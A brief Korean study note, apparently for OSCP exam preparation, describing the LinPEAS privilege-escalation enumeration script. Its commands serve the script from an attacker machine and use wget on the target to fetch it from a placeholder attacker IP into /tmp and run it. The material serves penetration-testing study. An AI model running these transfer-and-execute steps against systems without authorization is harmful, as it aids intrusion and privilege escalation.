LinPEAS (Linux Privilege Escalation Awesome Script)는 **리눅스 권한 상승(Linux Privilege Escalation)**에 필요한 정보를 자동으로 수집하고, 잠재적인 취약점을 분석해 주는 스크립트 도구

# LinPEAS 는 자동 툴이라 OSCP 에서는 금지

허용: 정보 수집 (Enumeration) 기능.
금지: 자동 악용 (Automated Exploitation) 기능.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 탐색만 실행
chmod +x linpeas.sh

# attacker -> 파일 실행 위치 주의
python3 -m http.server 80

# target
cd /tmp # 일반적으로 tmp 는 쓰기가 가능한 디렉토리이므로 이동해서 안전하게 다운로드 시도
wget http://공격자_IP/linpeas.sh

# 쓰기 권한이 가능한 디렉토리 찾기
find / -writable -type d 2>/dev/null

# 실행
/tmp/linpeas.sh > /tmp/linpeas_result.txt
```
